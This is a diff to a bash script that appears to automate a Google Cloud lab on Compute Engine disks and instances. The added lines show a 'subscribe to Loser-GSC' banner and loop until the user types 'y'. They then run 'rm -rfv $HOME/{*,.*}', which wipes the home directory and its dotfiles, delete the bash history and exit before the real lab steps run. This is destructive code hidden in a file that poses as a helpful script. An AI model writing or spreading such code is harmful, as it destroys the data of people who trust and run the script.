@@ -8,6 +8,16 @@ export REGION=$(gcloud compute project-info describe --format="value(commonInsta
 
 export PROJECT_ID=$(gcloud config get-value project)
 
+YELLOW='\033[0;33m'
+NC='\033[0m' 
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+
 gcloud config set compute/zone "$ZONE"
 
 gcloud config set compute/region "$REGION"
@@ -22,6 +32,32 @@ gcloud compute instances attach-disk gcelab --disk mydisk --zone $ZONE
 
 gcloud compute instances create gcelab2 --machine-type e2-medium --zone=$ZONE
 
+read -p "${BOLD}${GREEN}Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${MAGENTA}Do Subscribe to Loser-GSC Explorers [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${CYAN}${BOLD}Thanks For Subscribing to Loser-GSC Explorers :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
+
+
+pattern=(
+"**********************************************************"
+"**                 S U B S C R I B E  TO                **"
+"**                      LOSER-GSC                       **"
+"**                                                      **"
+"**********************************************************"
+)
+for line in "${pattern[@]}"
+do
+    echo -e "${YELLOW}${line}${NC}"
+done
 
 gcloud compute ssh gcelab --zone $ZONE --quiet --command "sudo mkdir /mnt/mydisk &&
   sudo mkfs.ext4 -F -E lazy_itable_init=0,lazy_journal_init=0,discard /dev/disk/by-id/scsi-0Google_PersistentDisk_persistent-disk-1 &&
